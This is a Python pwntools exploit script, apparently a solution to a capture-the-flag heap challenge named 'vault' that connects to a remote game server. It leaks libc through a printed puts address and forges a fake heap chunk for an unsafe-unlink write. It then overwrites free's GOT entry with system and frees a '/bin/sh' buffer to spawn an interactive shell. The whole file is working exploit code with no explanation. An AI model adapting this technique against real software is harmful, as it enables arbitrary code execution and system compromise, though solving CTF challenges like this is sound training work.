from pwn import *
from pwnlib.term.readline import delete_char_backward

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vault"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote(
    "play.scriptsorcerers.xyz", 10187)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


def add(idx):
    io.sendlineafter("> ", "1")
    io.sendlineafter("do you want to create?", str(idx))


def store(idx, content):
    io.sendlineafter("> ", "2")
    sleep(0.1)
    io.sendline(str(idx).encode())
    io.sendafter("want to put in your vault?", content)


def delete(idx):
    io.sendlineafter("> ", "3")
    io.sendlineafter(" do you want to free?", str(idx))


io.recvuntil("is ", drop=True)
puts = int(io.recv(14), 16)
log.success("puts:-----> " + hex(puts))
libc.address = puts - libc.symbols["puts"]

add(0)
add(1)

bss = 0x404090
payload = p64(0) + p64(0x81)
payload += p64(bss - 0x18)
payload += p64(bss - 0x10)
payload += b'A'*(0x80 - 0x20)
payload += p64(0x80)
payload += p64(0x90)

store(0, payload)

# ddebug("b free\n continue")
delete(1)

payload = p64(0) * 3
payload += p64(elf.got["free"])
store(0, payload)


store(0, p64(libc.symbols["system"]))
ddebug("break *0x401510\n continue")
store(1, "/bin/sh")
delete(1)

io.interactive()
